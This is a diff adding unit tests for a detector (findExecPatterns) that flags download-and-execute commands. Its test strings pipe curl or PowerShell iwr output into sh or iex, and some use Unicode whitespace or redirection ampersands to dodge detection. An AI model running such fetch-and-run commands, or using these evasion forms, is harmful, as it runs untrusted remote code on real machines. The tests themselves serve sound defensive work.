@@ -151,6 +151,16 @@ describe("wrapped shells in later stages (Vercel 01M81EJ2X60G4EFCGC78143380)", (
   });
 });
 
+describe("Vercel review of the performance commit", () => {
+  it("01M81GXJPSXKCEAAJMNNX0KAAM: Unicode whitespace after a pipe still reaches the sink", () => {
+    expect(findExecPatterns("iwr https://x.invalid/a.ps1 |\u00a0iex").map((h) => h.rule)).toContain("powershell-iex");
+    expect(findExecPatterns("curl https://x.invalid/i |\u2003sh").map((h) => h.rule)).toContain("curl-pipe-shell");
+  });
+  it("01M81GX5A9BKY6BCFZMZ8N3CCT: a redirection's & does not split the command", () => {
+    for (const t of ["curl https://x.invalid 2>&1 -o /tmp/a && sh /tmp/a", "curl https://x.invalid &>/dev/null -o /tmp/a; bash /tmp/a"]) expect(findExecPatterns(t).map((h) => h.rule), t).toContain("download-then-run");
+  });
+});
+
 describe("save, chmod and run on separate lines (relay, 22 Nov)", () => {
   it("finds the three-line forms", () => {
     expect(findExecPatterns("curl -o /tmp/x https://example.com/x\nchmod +x /tmp/x\n/tmp/x\n").map((h) => h.rule)).toContain("download-then-run");
